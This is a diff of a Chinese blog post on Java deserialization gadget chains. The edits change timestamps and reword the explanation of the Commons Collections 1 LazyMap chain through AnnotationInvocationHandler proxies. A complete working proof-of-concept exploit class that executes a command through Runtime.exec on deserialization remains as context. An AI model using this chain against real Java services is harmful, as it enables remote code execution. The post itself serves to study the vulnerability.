@@ -101,7 +101,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;0range228.github.io&#x2F;images&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92&#x2F;image-20210513182135950.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;0range228.github.io&#x2F;images&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92&#x2F;image-20210513182402111.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;0range228.github.io&#x2F;images&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92&#x2F;image-20210513183528337.png">
-<meta property="og:updated_time" content="2021-05-13T15:54:14.538Z">
+<meta property="og:updated_time" content="2021-05-13T16:25:14.859Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;0range228.github.io&#x2F;images&#x2F;Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92&#x2F;image-20210511172731640.png">
 
@@ -289,7 +289,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-13 23:54:14" itemprop="dateModified" datetime="2021-05-13T23:54:14+08:00">2021-05-13</time>
+                <time title="修改时间：2021-05-14 00:25:14" itemprop="dateModified" datetime="2021-05-14T00:25:14+08:00">2021-05-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -815,11 +815,10 @@
 <p>handler是一个InvocationHandler类对象，他内部有invoke方法</p>
 <p>我们可以做一个代理类a，让这个代理类代理LazyMap对象,handler也参与，负责invoke</p>
 <p>这样的话，无论以后a调用了LazyMap内部的任何方法，他都会先走一遍handler的invoke方法。</p>
-<p>注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”这句话内部的<strong>invoke方法</strong>，就是LazyMap的invoke方法。</p>
+<p>注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”这句话内部的<strong>invoke方法</strong>，<strong>就是LazyMap的invoke方法</strong>。</p>
 <p>抱着这个目标，我们还可以发现:</p>
 <ul>
-<li>AnnotationInvocationHandler继承了InvocationHandler，可以当动态代理，也可以作为handler</li>
-<li>AnnotationInvocationHandler类的readObject方法，可以触发setValue</li>
+<li>AnnotationInvocationHandler继承了InvocationHandler，它也可以当动态代理，也可以作为handler</li>
 </ul>
 <p>所以我们可以：</p>
 <ul>
@@ -839,10 +838,10 @@
 <p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171910871.png" alt="image-20210513171910871"></p>
 <p>果然进入到readObject方法，理论上现在this.memberValues就是我们传进来的mapProxy参数。</p>
 <p>mapProxy是一个动态代理，它代理了LazyMap这个类，handler是h1。</p>
-<p>那么这里一但调用了任何方法，都会走handler(h1)的invoke方法，<strong>this.memberValues.entrySet()就是一次调用</strong></p>
+<p>那么这里一但mapProxy调用了任何方法，都会走handler(h1)的invoke方法，<strong>this.memberValues.entrySet()就是一次调用</strong></p>
 <p>这里可以先在AnnotationInvocationHandler类的invoke处下一个断点，然后step-over：</p>
 <p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182135950.png" alt="image-20210513182135950"></p>
-<p>这里继续往下看，发现调用了this.memberValues.get()：</p>
+<p>这里继续往下看，发现AnnotationInvocationHandler类的invoke调用了this.memberValues.get()：</p>
 <p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513182402111.png" alt="image-20210513182402111"></p>
 <p>这会再一次触发invoke函数，并且现在this.memberValues的值为LazyMap，那么就会进入LazyMap.get方法：</p>
 <p>LazyMap.get内部就会有transform方法：</p>
@@ -853,8 +852,6 @@
 
 
 <h4 id="最终版本PoC-1"><a href="#最终版本PoC-1" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_LazyMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"abcd"</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建携带着LazyMap的AnnotationInvocationHandler实例h1</span></span><br><span class="line">        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target<span class="class">.<span class="keyword">class</span>,<span class="title">lazyMap</span>)</span>;</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理类实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(), <span class="title">h1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">mapProxy</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(h2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_LazyMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
 
 
 
